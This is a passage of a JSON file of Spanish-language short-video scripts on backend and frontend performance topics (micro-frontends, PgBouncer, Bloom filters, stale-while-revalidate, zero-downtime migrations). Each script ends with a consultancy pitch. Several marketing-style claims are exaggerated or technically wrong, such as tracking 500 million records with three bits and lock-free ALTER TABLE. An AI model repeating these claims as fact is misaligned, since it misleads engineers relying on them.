          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Asesoro a empresas en modernización de infraestructura serverless y diseño de sandboxes seguros. Contacto en mi biografía.",
          "visual_cue": "Cierre con consultoría de infraestructura",
          "props": {
            "header": "CONSULTORÍA DE INFRAESTRUCTURA",
            "title": "ARQUITECTURA SERVERLESS MODERNA",
            "cta": {
              "badge": "CONSULTORÍA TÉCNICA (Link en perfil)",
              "text": "¿Interesado en WASM o arquitecturas Edge? Link en mi perfil para agendar tu sesión."
            }
          }
        }
      ]
    }
  },
  {
    "key": "16_A",
    "topicNum": "16",
    "group": "16. FRACASO MICROFRONTENDS",
    "label": "Var A (Técnico): La sobrecarga del bundle: Por qué Module Federation degradó la web",
    "variation": "A (Técnico)",
    "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
    "manifest": {
      "title": "[16] La sobrecarga del bundle: Por qué Module Federation degradó la web (Var A)",
      "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
      "slug": "16_fracaso_microfrontends",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "vitals_hook",
          "type": "metrics_comparison",
          "duration": 6.5,
          "voiceover": "¿Por qué tantas empresas están desmantelando sus micro-frontends para volver a un monorepo unificado? Porque descargar múltiples versiones de frameworks destruyó la velocidad de carga.",
          "visual_cue": "Apertura directa con comparativa de Core Web Vitals: Micro-frontends frente a Monorepo limpio",
          "props": {
            "header": "IMPACTO EN CORE WEB VITALS",
            "metricA": {
              "label": "MICRO-FRONTENDS FEDERATION",
              "value": "3.4s LCP",
              "sub": "Puntaje de Performance: 42/100",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "MONOREPO UNIFICADO",
              "value": "0.6s LCP",
              "sub": "Puntaje de Performance: 98/100",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "bundle_waterfall",
          "type": "network_pipeline",
          "duration": 6.5,
          "voiceover": "Cada micro-frontend descarga su propia copia de librerías, provocando descargas de múltiples versiones de React y waterfalls de red inmanejables.",
          "visual_cue": "Pipeline visual mostrando la cascada de scripts y dependencias duplicadas",
          "props": {
            "header": "WATERFALL DE DESCARGA",
            "title": "FRAGMENTACIÓN DE DEPENDENCIAS",
            "subtitle": "TRIPLE CARGA DE FRAMEWORKS EN EL NAVEGADOR",
            "stages": [
              {
                "id": "app1",
                "label": "HEADER MFE (REACT 18.2)",
                "sub": "Descarga 140KB de runtime inicial",
                "y": 220,
                "color": "#ef4444",
                "metric": "180ms"
              },
              {
                "id": "app2",
                "label": "CHECKOUT MFE (REACT 19.0)",
                "sub": "Descarga 160KB duplicados por conflicto",
                "y": 520,
                "color": "#fbbf24",
                "metric": "290ms"
              },
              {
                "id": "app3",
                "label": "FOOTER MFE (VUE 3)",
                "sub": "Tercer framework compitiendo en hilo principal",
                "y": 820,
                "color": "#38bdf8",
                "metric": "420ms"
              }
            ]
          }
        },
        {
          "id": "cta_mf",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura frontend y optimizo Core Web Vitals para aplicaciones complejas. Link en mi perfil para agendar una sesión técnica.",
          "visual_cue": "Cierre con llamado a auditoría de arquitectura frontend",
          "props": {
            "header": "AUDITORÍA DE ARQUITECTURA FRONTEND",
            "title": "RECUPERA LA VELOCIDAD DE TU APLICACIÓN",
            "cta": {
              "badge": "AUDITORÍA DE RENDIMIENTO WEB (Link en bio)",
              "text": "¿Tu aplicación web está pesada y fragmentada? Link en mi perfil para auditarla."
            }
          }
        }
      ]
    }
  },
  {
    "key": "16_B",
    "topicNum": "16",
    "group": "16. FRACASO MICROFRONTENDS",
    "label": "Var B (Polémico): El desastre de los Micro-frontends: La vuelta al monorepo unificado",
    "variation": "B (Polémico)",
    "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
    "manifest": {
      "title": "[16] El desastre de los Micro-frontends: La vuelta al monorepo unificado (Var B)",
      "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
      "slug": "16_fracaso_microfrontends",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "mfe_impact_hook",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Adoptaste micro-frontends porque estaba de moda y ahora tienes un infierno de estilos rotos, dependencias cruzadas y aplicaciones lentas.",
          "visual_cue": "Tipografía de impacto gigante sin iconos genéricos",
          "props": {
            "layout": "impact",
            "badge": "LECCIONES DE INDUSTRIA",
            "lines": [
              {
                "text": "DESMANTELANDO LOS",
                "color": "#ef4444"
              },
              {
                "text": "MICRO-FRONTENDS",
                "color": "#ffffff"
              }
            ],
            "subtitle": "El regreso al monorepo limpio con arquitectura de islas"
          }
        },
        {
          "id": "tradeoff_mfe",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Los monorepos modernos con herramientas como Turborepo o Nx permiten que múltiples equipos trabajen sin destruir la experiencia del usuario final.",
          "visual_cue": "Matriz comparativa Micro-frontends vs Monorepo moderno",
          "props": {
            "header": "ORGANIZACIÓN VS EXPERIENCIA DE USUARIO",
            "title": "MICRO-FRONTENDS VS MONOREPO MODERNO",
            "colA": "MONOREPO CON TURBOREPO",
            "colB": "MICRO-FRONTENDS (IFRAMES/MFE)",
            "rows": [
              {
                "dim": "Experiencia de Usuario (LCP)",
                "a": "✔ Rápida y unificada",
                "b": "✖ Lenta y fragmentada",
                "aGood": true
              },
              {
                "dim": "Consistencia de Diseño (CSS)",
                "a": "✔ Sistema de diseño único",
                "b": "✖ Conflictos de estilos globales",
                "aGood": true
              },
              {
                "dim": "Mantenimiento de Dependencias",
                "a": "✔ 1 solo lockfile auditado",
                "b": "✖ 8 package.json desfasados",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_mf_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Ayudo a empresas a consolidar arquitecturas frontend fragmentadas en monorepos de alto rendimiento. Escríbeme o agenda en mi perfil.",
          "visual_cue": "Cierre con auditoría de arquitectura frontend",
          "props": {
            "header": "CONSOLIDACIÓN DE CODEBASE FRONTEND",
            "title": "SIMPLIFICA TUS PROCESOS DE ENTREGA",
            "cta": {
              "badge": "CONSULTORÍA FRONTEND (Contacto en perfil)",
              "text": "Consolida tus micro-frontends en un monorepo limpio. Link en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "17_A",
    "topicNum": "17",
    "group": "17. CONNECTION POOLING PGBOUNCER",
    "label": "Var A (Técnico): El costo de un fork() en Linux: Cómo 1000 conexiones matan a Postgres",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & ESCALABILIDAD",
    "manifest": {
      "title": "[17] El costo de un fork() en Linux: Cómo 1000 conexiones matan a Postgres (Var A)",
      "category": "BASES DE DATOS & ESCALABILIDAD",
      "slug": "17_connection_pooling_pgbouncer",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "fork_memory_hook",
          "type": "memory_layout",
          "duration": 6.5,
          "voiceover": "¿Por qué conectar mil clientes directos a PostgreSQL satura tu servidor aunque no hagan consultas? Porque Postgres crea un proceso independiente de diez megabytes por cada conexión.",
          "visual_cue": "Apertura directa con layout de memoria mostrando backend processes compitiendo por CPU y RAM",
          "props": {
            "header": "ARQUITECTURA DE PROCESOS",
            "title": "POSTMASTER Y BACKEND WORKERS",
            "items": [
              {
                "name": "1000 CONEXIONES DIRECTAS",
                "addr": "1000 PROCESOS FORK()",
                "value": "10GB RAM consumidos solo en sockets",
                "color": "#ef4444"
              },
              {
                "name": "CAMBIO DE CONTEXTO EN KERNEL",
                "addr": "CONTEXT SWITCH OVERHEAD",
                "value": "La CPU gasta 60% solo cambiando de tarea",
                "color": "#f59e0b"
              }
            ]
          }
        },
        {
          "id": "pgbouncer_pool",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "PgBouncer actúa como un embudo inteligente. Mantiene solo veinte conexiones reales con la base y atiende a miles de clientes en modo transaccional.",
          "visual_cue": "Diagrama de flujo: 10,000 conexiones de clientes pasando por PgBouncer a 20 conexiones reales de Postgres",
          "props": {
            "header": "CONNECTION POOLING EFICIENTE",
            "title": "EMBUDO TRANSACCIONAL CON PGBOUNCER",
            "nodes": [
              {
                "id": "clients",
                "label": "10,000 CONEXIONES ACTIVAS",
                "sublabel": "Servidores web y workers concurrentes",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "pooler",
                "label": "PGBOUNCER (TRANSACTION MODE)",
                "sublabel": "Multiplexa peticiones en un micro-proceso en C",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "db",
                "label": "POSTGRES (20 POOL WORKERS)",
                "sublabel": "100% de la CPU dedicada a ejecutar queries reales",
                "color": "#10b981",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "cta_pgb",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu base de datos sufre picos de latencia o agota su pool de conexiones en momentos críticos, audito tu infraestructura de datos. Link en mi perfil.",
          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
          "props": {
            "header": "AUDITORÍA DE RENDIMIENTO DE BASES DE DATOS",
            "title": "OPTIMIZA TUS POOLS DE CONEXIÓN",
            "cta": {
              "badge": "AUDITORÍA DE DATOS (Link en bio)",
              "text": "¿Problemas con max_connections en Postgres? Link en mi bio para agendar una auditoría técnica."
            }
          }
        }
      ]
    }
  },
  {
    "key": "17_B",
    "topicNum": "17",
    "group": "17. CONNECTION POOLING PGBOUNCER",
    "label": "Var B (Polémico): Tu base de datos no está lenta, estás saturando el pool de conexiones",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & ESCALABILIDAD",
    "manifest": {
      "title": "[17] Tu base de datos no está lenta, estás saturando el pool de conexiones (Var B)",
      "category": "BASES DE DATOS & ESCALABILIDAD",
      "slug": "17_connection_pooling_pgbouncer",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "fatal_pool_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Subiste el tamaño del servidor a una máquina de mil dólares y sigue lento. No necesitas más hardware: necesitas un pooler para evitar saturar conexiones.",
          "visual_cue": "Apertura directa con terminal mostrando error fatal de max_connections frente a PgBouncer",
          "props": {
            "header": "BENCHMARK DE CONEXIONES",
            "title": "CONEXIÓN DIRECTA VS POOLING TRANSACCIONAL",
            "termA": {
              "title": "SIN POOLER (MAX_CONNECTIONS = 1000)",
              "color": "#ef4444",
              "cmd": "psql -c \"SELECT count(*) FROM pg_stat_activity;\"",
              "status": "FATAL: remaining connection slots are reserved",
              "time": "Caída de servicio",
              "lines": [
                "Memoria swap activada en servidor de Postgres",
                "Pérdida de paquetes en cola de sockets",
                "Latencia p99 disparada a 8.2 segundos"
              ]
            },
            "termB": {
              "title": "CON PGBOUNCER (POOL_SIZE = 25)",
              "color": "#10b981",
              "cmd": "pgbouncer -d /etc/pgbouncer.ini",
              "status": "10,000 clientes atendidos sin error",
              "time": "Estable 24/7",
              "lines": [
                "Uso de memoria constante y bajo",
                "CPU al 40% ejecutando queries reales",
                "Latencia p99 estable en 4 milisegundos"
              ]
            }
          }
        },
        {
          "id": "cta_pgb_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la configuración de PostgreSQL y resuelvo cuellos de botella de concurrencia y latencia p99. Agenda tu revisión en mi bio.",
          "visual_cue": "Cierre con auditoría técnica de Postgres",
          "props": {
            "header": "AUDITORÍA DE POSTGRESQL & ESCALABILIDAD",
            "title": "RESOLUCIÓN DE CONGESTIÓN DE CONEXIONES",
            "cta": {
              "badge": "AUDITORÍA TÉCNICA (Link en perfil)",
              "text": "Elimina cuellos de botella en tu base de datos. Enlace directo en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "18_A",
    "topicNum": "18",
    "group": "18. BLOOM FILTERS PROBABILISTIC",
    "label": "Var A (Técnico): Bloom Filters: Cómo saber si un registro existe con 99% de certeza",
    "variation": "A (Técnico)",
    "category": "ESTRUCTURAS DE DATOS & CACHÉ",
    "manifest": {
      "title": "[18] Bloom Filters: Cómo saber si un registro existe con 99% de certeza (Var A)",
      "category": "ESTRUCTURAS DE DATOS & CACHÉ",
      "slug": "18_bloom_filters_probabilistic",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "bloom_math_hook",
          "type": "memory_layout",
          "duration": 6.5,
          "voiceover": "¿Cómo saber si un usuario ya leyó un post entre quinientos millones de registros usando solo tres bits de RAM? Con Bloom Filters probabilísticos.",
          "visual_cue": "Apertura directa con array de bits encendiéndose por hashes SHA-256 y Murmur3",
          "props": {
            "header": "MECANISMO DE HASHING",
            "title": "ARRAY DE BITS Y CERO FALSOS NEGATIVOS",
            "items": [
              {
                "name": "CLAVE: \"user_98412\"",
                "addr": "3 FUNCIONES HASH",
                "value": "Bits calculados: [14, 52, 88]",
                "color": "#38bdf8"
              },
              {
                "name": "ARRAY DE BITS EN RAM",
                "addr": "BIT 52 = 0",
                "value": "GARANTIZADO: El registro NO existe en disco",
                "color": "#10b981"
              }
            ]
          }
        },
        {
          "id": "bloom_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Puede tener falsos positivos leves, pero jamás un falso negativo. Esto ahorra millones de lecturas innecesarias al disco en Cassandra y Redis.",
          "visual_cue": "Terminal ejecutando comandos BF.EXISTS en Redis",
          "props": {
            "header": "REDIS BLOOM FILTER NATIVO",
            "title": "CONSULTA DE EXISTENCIA EN SUB-MILISEGUNDO",
            "filename": "cache/bloom.sh",
            "codeLines": [
              "# Comprueba existencia en RAM sin tocar base de datos principal:",
              "BF.ADD post_views \"usr_42:post_991\"",
              "BF.EXISTS post_views \"usr_42:post_991\" -> (integer) 1",
              "BF.EXISTS post_views \"usr_88:post_991\" -> (integer) 0",
              "# 99% de lecturas a disco descartadas en memoria RAM"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_bloom",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño arquitecturas de caché y capas probabilísticas para reducir la carga de bases de datos. Link en mi perfil para auditar tu sistema.",
          "visual_cue": "Cierre con llamado a auditoría de caché y performance",
          "props": {
            "header": "AUDITORÍA DE CACHÉ Y ALTO RENDIMIENTO",
            "title": "PROTEGE TU BASE DE CONSULTAS INÚTILES",
            "cta": {
              "badge": "AUDITORÍA DE CACHÉ (Link en bio)",
              "text": "¿Tu base de datos sufre por queries repetitivas? Link en mi perfil para auditar tu caché."
            }
          }
        }
      ]
    }
  },
  {
    "key": "18_B",
    "topicNum": "18",
    "group": "18. BLOOM FILTERS PROBABILISTIC",
    "label": "Var B (Polémico): Ahorra miles de dólares en queries usando filtros probabilísticos en Redis",
    "variation": "B (Polémico)",
    "category": "ESTRUCTURAS DE DATOS & CACHÉ",
    "manifest": {
      "title": "[18] Ahorra miles de dólares en queries usando filtros probabilísticos en Redis (Var B)",
      "category": "ESTRUCTURAS DE DATOS & CACHÉ",
      "slug": "18_bloom_filters_probabilistic",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "bloom_latency_hook",
          "type": "latency_scale",
          "duration": 6.5,
          "voiceover": "Hacer consultas a tu base de datos relacional para comprobar si un registro existe está quemando tu presupuesto. Un filtro Bloom en Redis responde en microsegundos.",
          "visual_cue": "Apertura directa con escala de latencia comparando RAM vs Query SQL",
          "props": {
            "header": "TIEMPO DE RESPUESTA",
            "title": "FILTRO EN MEMORIA VS BÚSQUEDA EN DISCO",
            "subtitle": "COMPARATIVA DE LATENCIA DE COMPROBACIÓN",
            "tiers": [
              {
                "name": "BLOOM FILTER EN RAM (REDIS)",
                "latency": "0.05 ms",
                "ratio": 0.1,
                "color": "#10b981",
                "human": "Microsegundos"
              },
              {
                "name": "QUERY SQL CON ÍNDICE B-TREE",
                "latency": "4.5 ms",
                "ratio": 0.6,
                "color": "#fbbf24",
                "human": "90x más lento"
              },
              {
                "name": "ESCANEO SIN ÍNDICE (TABLE SCAN)",
                "latency": "120 ms",
                "ratio": 1,
                "color": "#ef4444",
                "human": "Colapso de disco"
              }
            ],
            "conclusion": "Descartas el 99% de las comprobaciones antes de tocar el motor de base de datos.",
            "conclusionSub": "Menos consumo de CPU, menos IOPS y menor factura cloud."
          }
        },
        {
          "id": "cta_bloom_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito capas de persistencia y caching para reducir facturas y multiplicar la escala de tu producto. Contáctame en el link de la bio.",
          "visual_cue": "Cierre con auditoría de base de datos y caché",
          "props": {
            "header": "AUDITORÍA DE ESCALABILIDAD & COSTES",
            "title": "OPTIMIZACIÓN DE CAPAS DE CACHÉ",
            "cta": {
              "badge": "AUDITORÍA DE DATOS (Link en bio)",
              "text": "Reduce el estrés de tu base de datos y recorta costes. Agenda tu sesión en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "19_A",
    "topicNum": "19",
    "group": "19. CACHE STALE WHILE REVALIDATE",
    "label": "Var A (Técnico): Anatomía de un Cache Stampede y cómo el encabezado SWR lo neutraliza",
    "variation": "A (Técnico)",
    "category": "REDES & ARQUITECTURA DE CACHÉ",
    "manifest": {
      "title": "[19] Anatomía de un Cache Stampede y cómo el encabezado SWR lo neutraliza (Var A)",
      "category": "REDES & ARQUITECTURA DE CACHÉ",
      "slug": "19_cache_stale_while_revalidate",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "stampede_flow_hook",
          "type": "network_pipeline",
          "duration": 6.5,
          "voiceover": "¿Qué pasa cuando la caché de tu página más visitada expira justo cuando entran diez mil usuarios a la vez? Tu servidor colapsa por una estampida de peticiones a la base de datos.",
          "visual_cue": "Apertura directa con pipeline visual mostrando la avalancha de peticiones colapsando la base",
          "props": {
            "header": "AVALANCHA DE PETICIONES",
            "title": "CACHE MISS SIMULTÁNEO",
            "subtitle": "10,000 CONEXIONES ATACANDO LA BASE DE DATOS",
            "stages": [
              {
                "id": "users",
                "label": "10,000 USUARIOS CONCURRENTES",
                "sublabel": "Petición masiva en el segundo 00:00",
                "y": 220,
                "color": "#ef4444",
                "metric": "10K RPS"
              },
              {
                "id": "cdn",
                "label": "CDN CACHE (EXPIRADA)",
                "sublabel": "TTL agotado y deja pasar todo el tráfico",
                "y": 520,
                "color": "#fbbf24",
                "metric": "Stampede"
              },
              {
                "id": "db",
                "label": "BASE DE DATOS EN COLAPSO",
                "sublabel": "10,000 queries pesadas idénticas a la vez",
                "y": 820,
                "color": "#ef4444",
                "metric": "CPU 100%"
              }
            ]
          }
        },
        {
          "id": "swr_solution",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Con Stale-While-Revalidate la CDN entrega el contenido en cinco milisegundos mientras un solo hilo actualiza la caché en segundo plano.",
          "visual_cue": "Terminal configurando encabezado Cache-Control stale-while-revalidate",
          "props": {
            "header": "CABECERA HTTP PROTECTORA",
            "title": "STALE-WHILE-REVALIDATE PATTERN",
            "filename": "routes/products.ts",
            "codeLines": [
              "# Sirve respuesta anterior en 5ms y actualiza en background sin bloquear:",
              "reply.header(\"Cache-Control\", ",
              "  \"public, max-age=60, stale-while-revalidate=86400, stale-if-error=86400\"",
              ");",
              "# Resultado: Cero Cache Stampedes y rendimiento 100% estable"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_swr",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de caching y entrega de contenido en CDN para garantizar escalabilidad extrema en picos de tráfico. Enlace en mi bio.",
          "visual_cue": "Cierre con llamado a auditoría de arquitectura y escalabilidad",
          "props": {
            "header": "AUDITORÍA DE ESCALABILIDAD Y CACHING",
            "title": "RESISTENCIA A PICOS MASIVOS DE TRÁFICO",
            "cta": {
              "badge": "AUDITORÍA DE ESCALABILIDAD (Link en bio)",
              "text": "¿Tu web sufre caídas en picos de tráfico? Link en mi perfil para agendar tu diagnóstico."
            }
          }
        }
      ]
    }
  },
  {
    "key": "19_B",
    "topicNum": "19",
    "group": "19. CACHE STALE WHILE REVALIDATE",
    "label": "Var B (Polémico): Cómo servir respuestas en 5 milisegundos sin servir datos desactualizados",
    "variation": "B (Polémico)",
    "category": "REDES & ARQUITECTURA DE CACHÉ",
    "manifest": {
      "title": "[19] Cómo servir respuestas en 5 milisegundos sin servir datos desactualizados (Var B)",
      "category": "REDES & ARQUITECTURA DE CACHÉ",
      "slug": "19_cache_stale_while_revalidate",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "metrics_swr_hook",
          "type": "metrics_comparison",
          "duration": 6.5,
          "voiceover": "No necesitas pagar un clúster de Redis para que tu web vuele. El encabezado Stale-While-Revalidate en el Edge reduce la carga de base de datos en un noventa y ocho por ciento.",
          "visual_cue": "Apertura directa con métricas de descarga de servidor y latencia TTFB",
          "props": {
            "header": "DESCARGA DE SERVIDOR DE ORIGEN",
            "metricA": {
              "label": "PETICIONES A BASE DE DATOS",
              "value": "-98.4%",
              "sub": "Solo una actualización en background por minuto",
              "color": "#10b981"
            },
            "metricB": {
              "label": "LATENCIA PERCIBIDA (TTFB)",
              "value": "6ms p95",
              "sub": "Servido directo desde el Edge más cercano",
              "color": "#38bdf8"
            }
          }
        },
        {
          "id": "cta_swr_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Optimizo la capa de borde y distribución de contenido para aplicaciones de alta concurrencia. Contáctame en el link de la bio.",
          "visual_cue": "Cierre con consultoría de escalabilidad",
          "props": {
            "header": "CONSULTORÍA DE ESCALABILIDAD",
            "title": "MÁXIMA VELOCIDAD Y MÍNIMO COSTE DE SERVIDOR",
            "cta": {
              "badge": "CONSULTORÍA DE ESCALABILIDAD (Link en perfil)",
              "text": "Haz que tu backend soporte millones de visitas sin pestañear. Hablemos en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "20_A",
    "topicNum": "20",
    "group": "20. MIGRACIONES ZERO DOWNTIME",
    "label": "Var A (Técnico): El Patrón Expand & Contract: Modificar esquemas masivos con 0s downtime",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
    "manifest": {
      "title": "[20] El Patrón Expand & Contract: Modificar esquemas masivos con 0s downtime (Var A)",
      "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
      "slug": "20_migraciones_zero_downtime",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "expand_phases_hook",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "¿Cómo renombrar una columna en cincuenta millones de filas sin provocar un solo error 500? Nunca lo hagas en un solo paso: usa el patrón Expand & Contract.",
          "visual_cue": "Apertura directa con diagrama de las tres fases del patrón Expand & Contract",
          "props": {
            "header": "LAS TRES FASES DEL PATRÓN",
            "title": "TRANSICIÓN SEGURA DE ESQUEMA",
            "nodes": [
              {
                "id": "f1",
                "label": "1. FASE EXPAND",
                "sublabel": "Añadir columna nueva vacía (Nullable) sin locks",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "f2",
                "label": "2. DOBLE ESCRITURA Y BACKFILL",
                "sublabel": "La app escribe en ambas columnas y worker migra histórico",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "f3",
                "label": "3. FASE CONTRACT",
                "sublabel": "La app solo lee la nueva y drop seguro de la columna vieja",
                "color": "#10b981",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "migration_sql",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Hacerlo por fases te permite revertir en cualquier instante sin poner en riesgo la disponibilidad del negocio ni corromper datos.",
          "visual_cue": "Terminal mostrando script seguro de migración con pg_repack / gh-ost",
          "props": {
            "header": "MIGRACIÓN CON CONTROL DE BLOQUEOS",
            "title": "CERO EXCLUSIVE LOCKS EN TABLA",
            "filename": "db/migrations/20261025_safe_column.sql",
            "codeLines": [
              "-- 1. Añade columna sin bloquear lectores ni escritores:",
              "ALTER TABLE users ADD COLUMN phone_v2 VARCHAR(32);",
              "-- 2. Backfill en lotes pequeños para no saturar transacciones:",
              "UPDATE users SET phone_v2 = phone WHERE id BETWEEN $1 AND $2;",
              "-- 3. Deploy de código con lectura de phone_v2"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_migration",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Asesoro y acompaño a equipos en migraciones críticas de base de datos sin tiempo de inactividad. Agenda una sesión técnica en mi perfil.",
          "visual_cue": "Cierre con consultoría de migración crítica",
          "props": {
            "header": "CONSULTORÍA DE MIGRACIONES CRÍTICAS",
            "title": "CAMBIOS DE ESQUEMA SIN TIEMPO DE CAÍDA",
            "cta": {
              "badge": "CONSULTORÍA DE DATOS (Link en bio)",
              "text": "¿Planeas una migración compleja de base de datos? Link en mi perfil para acompañar a tu equipo."
            }
          }
        }
      ]
    }
  },
  {
    "key": "20_B",
    "topicNum": "20",
    "group": "20. MIGRACIONES ZERO DOWNTIME",
    "label": "Var B (Polémico): Nunca hagas ALTER TABLE a ciegas: Cómo evitar bloqueos de tabla",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
    "manifest": {
      "title": "[20] Nunca hagas ALTER TABLE a ciegas: Cómo evitar bloqueos de tabla (Var B)",
      "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
      "slug": "20_migraciones_zero_downtime",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "lock_split_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Hiciste un ALTER TABLE en producción y bloqueaste todas las lecturas y escrituras durante cuarenta minutos. Postgres adquiere un ACCESS EXCLUSIVE lock que frena cada petición.",
          "visual_cue": "Apertura directa con terminal mostrando bloqueo infinito de tabla frente a migración segura con lock_timeout",
          "props": {
            "header": "MECANISMO DE BLOQUEO DE POSTGRES",
            "title": "ACCESS EXCLUSIVE LOCK VS LOCK TIMEOUT",
            "termA": {
              "title": "MIGRACIÓN SIN TIMEOUT",
              "color": "#ef4444",
              "cmd": "ALTER TABLE orders ADD COLUMN status_code INT;",
              "status": "Esperando lock indefinidamente",
              "time": "Incidencia P1",
              "lines": [
                "Todas las queries entrantes se encolan detrás del ALTER",
                "Pool de conexiones saturado al 100%",
                "La aplicación completa deja de responder a usuarios"
              ]
            },
            "termB": {
              "title": "MIGRACIÓN CON DEFENSA",
              "color": "#10b981",
              "cmd": "SET lock_timeout = \"2s\"; ALTER TABLE orders ...",
              "status": "Si no adquiere el lock en 2s, aborta limpiamente",
              "time": "Zero caída",
              "lines": [
                "Reintenta con backoff en momentos de menor concurrencia",
                "Los usuarios nunca notan degradación del servicio",
                "Garantía total de disponibilidad"
              ]
            }
          }
        },
        {
          "id": "cta_migration_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito planes de migración de datos y acompaño a startups en cambios estructurales de base de datos sin riesgo. Contáctame en el link de la bio.",
          "visual_cue": "Cierre con consultoría de migración de bases de datos",
          "props": {
            "header": "CONSULTORÍA DE MIGRACIONES SEGURAS",
            "title": "PROTEGE TU DISPONIBILIDAD EN PRODUCCIÓN",
            "cta": {
              "badge": "AUDITORÍA DE MIGRACIONES (Link en bio)",
              "text": "Evita caídas en tus cambios de esquema. Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  }
];
